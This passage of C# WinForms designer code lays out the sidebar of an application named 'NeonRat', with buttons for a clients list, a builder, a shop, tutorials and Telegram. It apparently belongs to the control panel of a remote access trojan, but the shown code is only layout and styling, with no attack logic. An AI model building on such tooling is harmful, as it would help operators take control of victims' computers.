			this.bunifuSeparator9.Size = new System.Drawing.Size(10, 735);
			this.bunifuSeparator9.TabIndex = 74;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator9, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator9, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator9, "");
			this.bunifuSeparator1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator1.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator1.LineThickness = 1;
			this.bunifuSeparator1.Location = new System.Drawing.Point(-5, 1);
			this.bunifuSeparator1.Name = "bunifuSeparator1";
			this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Vertical;
			this.bunifuSeparator1.Size = new System.Drawing.Size(10, 735);
			this.bunifuSeparator1.TabIndex = 75;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator1, "");
			this.bunifuSeparator2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator2.BackgroundImage");
			this.bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator2.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator2, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator2, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator2.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator2.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator2.LineThickness = 1;
			this.bunifuSeparator2.Location = new System.Drawing.Point(0, 730);
			this.bunifuSeparator2.Name = "bunifuSeparator2";
			this.bunifuSeparator2.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator2.Size = new System.Drawing.Size(1419, 12);
			this.bunifuSeparator2.TabIndex = 76;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator2, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator2, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator2, "");
			this.bunifuGradientPanel1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuGradientPanel1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuGradientPanel1.BackgroundImage");
			this.bunifuGradientPanel1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuGradientPanel1.BorderRadius = 1;
			this.bunifuGradientPanel1.Controls.Add(this.bunifuSeparator11);
			this.bunifuGradientPanel1.Controls.Add(this.btnLogout);
			this.bunifuGradientPanel1.Controls.Add(this.btnTelegram);
			this.bunifuGradientPanel1.Controls.Add(this.btnTuts);
			this.bunifuGradientPanel1.Controls.Add(this.btnShop);
			this.bunifuGradientPanel1.Controls.Add(this.btnBuilder);
			this.bunifuGradientPanel1.Controls.Add(this.btnClients);
			this.bunifuGradientPanel1.Controls.Add(this.bunifuSeparator16);
			this.bunifuGradientPanel1.Controls.Add(this.bunifuSeparator13);
			this.bunifuGradientPanel1.Controls.Add(this.bunifuSeparator10);
			this.bunifuGradientPanel1.Controls.Add(this.bunifuSeparator7);
			this.bunifuGradientPanel1.Controls.Add(this.bunifuSeparator6);
			this.bunifuGradientPanel1.Controls.Add(this.bunifuSeparator5);
			this.bunifuGradientPanel1.Controls.Add(this.bunifuSeparator4);
			this.bunifuGradientPanel1.Controls.Add(this.bunifuSeparator3);
			this.bunifuTransition2.SetDecoration(this.bunifuGradientPanel1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuGradientPanel1, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuGradientPanel1.Dock = System.Windows.Forms.DockStyle.Left;
			this.bunifuGradientPanel1.GradientBottomLeft = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuGradientPanel1.GradientBottomRight = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuGradientPanel1.GradientTopLeft = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuGradientPanel1.GradientTopRight = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuGradientPanel1.Location = new System.Drawing.Point(0, 0);
			this.bunifuGradientPanel1.Margin = new System.Windows.Forms.Padding(4);
			this.bunifuGradientPanel1.Name = "bunifuGradientPanel1";
			this.bunifuGradientPanel1.Quality = 10;
			this.bunifuGradientPanel1.Size = new System.Drawing.Size(123, 738);
			this.bunifuGradientPanel1.TabIndex = 77;
			this.bunifuToolTip1.SetToolTip(this.bunifuGradientPanel1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuGradientPanel1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuGradientPanel1, "");
			this.bunifuSeparator11.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator11.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator11.BackgroundImage");
			this.bunifuSeparator11.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator11.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator11, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator11, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator11.LineColor = System.Drawing.Color.WhiteSmoke;
			this.bunifuSeparator11.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator11.LineThickness = 1;
			this.bunifuSeparator11.Location = new System.Drawing.Point(29, 139);
			this.bunifuSeparator11.Name = "bunifuSeparator11";
			this.bunifuSeparator11.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator11.Size = new System.Drawing.Size(65, 16);
			this.bunifuSeparator11.TabIndex = 23;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator11, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator11, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator11, "");
			this.btnLogout.AllowAnimations = true;
			this.btnLogout.AllowBorderColorChanges = true;
			this.btnLogout.AllowMouseEffects = true;
			this.btnLogout.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.btnLogout.AnimationSpeed = 200;
			this.btnLogout.BackColor = System.Drawing.Color.Transparent;
			this.btnLogout.BackgroundColor = System.Drawing.Color.Transparent;
			this.btnLogout.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.btnLogout.BorderRadius = 1;
			this.btnLogout.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.btnLogout.BorderThickness = 1;
			this.btnLogout.ColorContrastOnClick = 30;
			this.btnLogout.ColorContrastOnHover = 30;
			this.btnLogout.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.btnLogout.CustomizableEdges = borderEdges;
			this.bunifuTransition2.SetDecoration(this.btnLogout, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.btnLogout, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.btnLogout.DialogResult = System.Windows.Forms.DialogResult.None;
			this.btnLogout.Image = (System.Drawing.Image)resources.GetObject("btnLogout.Image");
			this.btnLogout.ImageMargin = new System.Windows.Forms.Padding(0);
			this.btnLogout.Location = new System.Drawing.Point(44, 661);
			this.btnLogout.Name = "btnLogout";
			this.btnLogout.RoundBorders = false;
			this.btnLogout.ShowBorders = true;
			this.btnLogout.Size = new System.Drawing.Size(35, 35);
			this.btnLogout.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.btnLogout.TabIndex = 21;
			this.bunifuToolTip1.SetToolTip(this.btnLogout, "Logout NeonRat!");
			this.bunifuToolTip1.SetToolTipIcon(this.btnLogout, null);
			this.bunifuToolTip1.SetToolTipTitle(this.btnLogout, "NeonRat");
			this.btnTelegram.AllowAnimations = true;
			this.btnTelegram.AllowBorderColorChanges = true;
			this.btnTelegram.AllowMouseEffects = true;
			this.btnTelegram.AnimationSpeed = 200;
			this.btnTelegram.BackColor = System.Drawing.Color.Transparent;
			this.btnTelegram.BackgroundColor = System.Drawing.Color.Transparent;
			this.btnTelegram.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.btnTelegram.BorderRadius = 1;
			this.btnTelegram.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.btnTelegram.BorderThickness = 1;
			this.btnTelegram.ColorContrastOnClick = 30;
			this.btnTelegram.ColorContrastOnHover = 30;
			this.btnTelegram.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges2.BottomLeft = true;
			borderEdges2.BottomRight = true;
			borderEdges2.TopLeft = true;
			borderEdges2.TopRight = true;
			this.btnTelegram.CustomizableEdges = borderEdges2;
			this.bunifuTransition2.SetDecoration(this.btnTelegram, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.btnTelegram, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.btnTelegram.DialogResult = System.Windows.Forms.DialogResult.None;
			this.btnTelegram.Image = (System.Drawing.Image)resources.GetObject("btnTelegram.Image");
			this.btnTelegram.ImageMargin = new System.Windows.Forms.Padding(0);
			this.btnTelegram.Location = new System.Drawing.Point(44, 385);
			this.btnTelegram.Name = "btnTelegram";
			this.btnTelegram.RoundBorders = false;
			this.btnTelegram.ShowBorders = true;
			this.btnTelegram.Size = new System.Drawing.Size(35, 35);
			this.btnTelegram.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.btnTelegram.TabIndex = 20;
			this.bunifuToolTip1.SetToolTip(this.btnTelegram, "Follow us with telegram!");
			this.bunifuToolTip1.SetToolTipIcon(this.btnTelegram, null);
			this.bunifuToolTip1.SetToolTipTitle(this.btnTelegram, "NeonRat");
			this.btnTelegram.Click += new System.EventHandler(btnTelegram_Click);
			this.btnTuts.AllowAnimations = true;
			this.btnTuts.AllowBorderColorChanges = true;
			this.btnTuts.AllowMouseEffects = true;
			this.btnTuts.AnimationSpeed = 200;
			this.btnTuts.BackColor = System.Drawing.Color.Transparent;
			this.btnTuts.BackgroundColor = System.Drawing.Color.Transparent;
			this.btnTuts.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.btnTuts.BorderRadius = 1;
			this.btnTuts.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.btnTuts.BorderThickness = 1;
			this.btnTuts.ColorContrastOnClick = 30;
			this.btnTuts.ColorContrastOnHover = 30;
			this.btnTuts.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges3.BottomLeft = true;
			borderEdges3.BottomRight = true;
			borderEdges3.TopLeft = true;
			borderEdges3.TopRight = true;
			this.btnTuts.CustomizableEdges = borderEdges3;
			this.bunifuTransition2.SetDecoration(this.btnTuts, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.btnTuts, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.btnTuts.DialogResult = System.Windows.Forms.DialogResult.None;
			this.btnTuts.Image = (System.Drawing.Image)resources.GetObject("btnTuts.Image");
			this.btnTuts.ImageMargin = new System.Windows.Forms.Padding(0);
			this.btnTuts.Location = new System.Drawing.Point(44, 328);
			this.btnTuts.Name = "btnTuts";
			this.btnTuts.RoundBorders = false;
			this.btnTuts.ShowBorders = true;
			this.btnTuts.Size = new System.Drawing.Size(35, 35);
			this.btnTuts.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.btnTuts.TabIndex = 19;
			this.bunifuToolTip1.SetToolTip(this.btnTuts, "Video tutorials!");
			this.bunifuToolTip1.SetToolTipIcon(this.btnTuts, null);
			this.bunifuToolTip1.SetToolTipTitle(this.btnTuts, "NeonRat");
			this.btnTuts.Click += new System.EventHandler(btnTuts_Click);
			this.btnShop.AllowAnimations = true;
			this.btnShop.AllowBorderColorChanges = true;
			this.btnShop.AllowMouseEffects = true;
			this.btnShop.AnimationSpeed = 200;
			this.btnShop.BackColor = System.Drawing.Color.Transparent;
			this.btnShop.BackgroundColor = System.Drawing.Color.Transparent;
			this.btnShop.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.btnShop.BorderRadius = 1;
			this.btnShop.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.btnShop.BorderThickness = 1;
			this.btnShop.ColorContrastOnClick = 30;
			this.btnShop.ColorContrastOnHover = 30;
			this.btnShop.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges4.BottomLeft = true;
			borderEdges4.BottomRight = true;
			borderEdges4.TopLeft = true;
			borderEdges4.TopRight = true;
			this.btnShop.CustomizableEdges = borderEdges4;
			this.bunifuTransition2.SetDecoration(this.btnShop, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.btnShop, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.btnShop.DialogResult = System.Windows.Forms.DialogResult.None;
			this.btnShop.Image = (System.Drawing.Image)resources.GetObject("btnShop.Image");
			this.btnShop.ImageMargin = new System.Windows.Forms.Padding(0);
			this.btnShop.Location = new System.Drawing.Point(44, 271);
			this.btnShop.Name = "btnShop";
			this.btnShop.RoundBorders = false;
			this.btnShop.ShowBorders = true;
			this.btnShop.Size = new System.Drawing.Size(35, 35);
			this.btnShop.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.btnShop.TabIndex = 18;
			this.bunifuToolTip1.SetToolTip(this.btnShop, "Online shop!");
			this.bunifuToolTip1.SetToolTipIcon(this.btnShop, null);
			this.bunifuToolTip1.SetToolTipTitle(this.btnShop, "NeonRat");
			this.btnShop.Click += new System.EventHandler(btnShop_Click);
			this.btnBuilder.AllowAnimations = true;
			this.btnBuilder.AllowBorderColorChanges = true;
			this.btnBuilder.AllowMouseEffects = true;
			this.btnBuilder.AnimationSpeed = 200;
			this.btnBuilder.BackColor = System.Drawing.Color.Transparent;
			this.btnBuilder.BackgroundColor = System.Drawing.Color.Transparent;
			this.btnBuilder.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.btnBuilder.BorderRadius = 1;
			this.btnBuilder.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.btnBuilder.BorderThickness = 1;
			this.btnBuilder.ColorContrastOnClick = 30;
			this.btnBuilder.ColorContrastOnHover = 30;
			this.btnBuilder.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges5.BottomLeft = true;
			borderEdges5.BottomRight = true;
			borderEdges5.TopLeft = true;
			borderEdges5.TopRight = true;
			this.btnBuilder.CustomizableEdges = borderEdges5;
			this.bunifuTransition2.SetDecoration(this.btnBuilder, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.btnBuilder, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.btnBuilder.DialogResult = System.Windows.Forms.DialogResult.None;
			this.btnBuilder.Image = (System.Drawing.Image)resources.GetObject("btnBuilder.Image");
			this.btnBuilder.ImageMargin = new System.Windows.Forms.Padding(0);
			this.btnBuilder.Location = new System.Drawing.Point(44, 214);
			this.btnBuilder.Name = "btnBuilder";
			this.btnBuilder.RoundBorders = false;
			this.btnBuilder.ShowBorders = true;
			this.btnBuilder.Size = new System.Drawing.Size(35, 35);
			this.btnBuilder.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.btnBuilder.TabIndex = 17;
			this.bunifuToolTip1.SetToolTip(this.btnBuilder, "Builder!");
			this.bunifuToolTip1.SetToolTipIcon(this.btnBuilder, null);
			this.bunifuToolTip1.SetToolTipTitle(this.btnBuilder, "NeonRat");
			this.btnBuilder.Click += new System.EventHandler(btnBuilder_Click);
			this.btnClients.AllowAnimations = true;
			this.btnClients.AllowBorderColorChanges = true;
			this.btnClients.AllowMouseEffects = true;
			this.btnClients.AnimationSpeed = 200;
			this.btnClients.BackColor = System.Drawing.Color.Transparent;
			this.btnClients.BackgroundColor = System.Drawing.Color.Transparent;
			this.btnClients.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.btnClients.BorderRadius = 1;
			this.btnClients.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.btnClients.BorderThickness = 1;
			this.btnClients.ColorContrastOnClick = 30;
			this.btnClients.ColorContrastOnHover = 30;
			this.btnClients.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges6.BottomLeft = true;
			borderEdges6.BottomRight = true;
			borderEdges6.TopLeft = true;
			borderEdges6.TopRight = true;
			this.btnClients.CustomizableEdges = borderEdges6;
			this.bunifuTransition2.SetDecoration(this.btnClients, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.btnClients, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.btnClients.DialogResult = System.Windows.Forms.DialogResult.None;
			this.btnClients.Image = (System.Drawing.Image)resources.GetObject("btnClients.Image");
			this.btnClients.ImageMargin = new System.Windows.Forms.Padding(0);
			this.btnClients.Location = new System.Drawing.Point(44, 157);
			this.btnClients.Name = "btnClients";
			this.btnClients.RoundBorders = false;
			this.btnClients.ShowBorders = true;
			this.btnClients.Size = new System.Drawing.Size(35, 35);
			this.btnClients.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.btnClients.TabIndex = 16;
			this.bunifuToolTip1.SetToolTip(this.btnClients, "Clients list!");
			this.bunifuToolTip1.SetToolTipIcon(this.btnClients, null);
			this.bunifuToolTip1.SetToolTipTitle(this.btnClients, "NeonRat");
			this.btnClients.Click += new System.EventHandler(btnClients_Click);
			this.bunifuSeparator16.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator16.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator16.BackgroundImage");
			this.bunifuSeparator16.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator16.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator16, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator16, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator16.LineColor = System.Drawing.Color.WhiteSmoke;
			this.bunifuSeparator16.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator16.LineThickness = 1;
			this.bunifuSeparator16.Location = new System.Drawing.Point(29, 196);
			this.bunifuSeparator16.Name = "bunifuSeparator16";
			this.bunifuSeparator16.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator16.Size = new System.Drawing.Size(65, 16);
			this.bunifuSeparator16.TabIndex = 15;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator16, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator16, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator16, "");
			this.bunifuSeparator13.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator13.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator13.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator13.BackgroundImage");
			this.bunifuSeparator13.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator13.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator13, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator13, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator13.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator13.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator13.LineThickness = 1;
			this.bunifuSeparator13.Location = new System.Drawing.Point(1, 731);
			this.bunifuSeparator13.Name = "bunifuSeparator13";
			this.bunifuSeparator13.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator13.Size = new System.Drawing.Size(132, 12);
			this.bunifuSeparator13.TabIndex = 13;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator13, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator13, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator13, "");
			this.bunifuSeparator10.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator10.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator10.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator10.BackgroundImage");
			this.bunifuSeparator10.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator10.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator10, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator10, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator10.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator10.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator10.LineThickness = 1;
			this.bunifuSeparator10.Location = new System.Drawing.Point(1, -5);
			this.bunifuSeparator10.Name = "bunifuSeparator10";
			this.bunifuSeparator10.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator10.Size = new System.Drawing.Size(130, 10);
			this.bunifuSeparator10.TabIndex = 12;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator10, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator10, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator10, "");
			this.bunifuSeparator7.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.bunifuSeparator7.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator7.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator7.BackgroundImage");
			this.bunifuSeparator7.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator7.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator7, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator7, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator7.LineColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuSeparator7.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
			this.bunifuSeparator7.LineThickness = 1;
			this.bunifuSeparator7.Location = new System.Drawing.Point(-5, -1);
			this.bunifuSeparator7.Name = "bunifuSeparator7";
			this.bunifuSeparator7.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Vertical;
			this.bunifuSeparator7.Size = new System.Drawing.Size(10, 740);
			this.bunifuSeparator7.TabIndex = 10;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator7, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator7, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator7, "");
			this.bunifuSeparator6.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator6.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator6.BackgroundImage");
			this.bunifuSeparator6.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator6.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator6, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator6, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator6.LineColor = System.Drawing.Color.WhiteSmoke;
			this.bunifuSeparator6.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator6.LineThickness = 1;
			this.bunifuSeparator6.Location = new System.Drawing.Point(29, 422);
			this.bunifuSeparator6.Name = "bunifuSeparator6";
			this.bunifuSeparator6.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator6.Size = new System.Drawing.Size(65, 16);
			this.bunifuSeparator6.TabIndex = 8;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator6, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator6, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator6, "");
			this.bunifuSeparator5.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator5.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator5.BackgroundImage");
			this.bunifuSeparator5.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator5.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator5, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator5, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator5.LineColor = System.Drawing.Color.WhiteSmoke;
			this.bunifuSeparator5.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator5.LineThickness = 1;
			this.bunifuSeparator5.Location = new System.Drawing.Point(29, 365);
			this.bunifuSeparator5.Name = "bunifuSeparator5";
			this.bunifuSeparator5.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator5.Size = new System.Drawing.Size(65, 16);
			this.bunifuSeparator5.TabIndex = 7;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator5, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator5, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator5, "");
			this.bunifuSeparator4.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator4.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator4.BackgroundImage");
			this.bunifuSeparator4.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator4.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuTransition2.SetDecoration(this.bunifuSeparator4, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuTransition1.SetDecoration(this.bunifuSeparator4, Bunifu.UI.WinForms.BunifuTransition.DecorationType.None);
			this.bunifuSeparator4.LineColor = System.Drawing.Color.WhiteSmoke;
			this.bunifuSeparator4.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator4.LineThickness = 1;
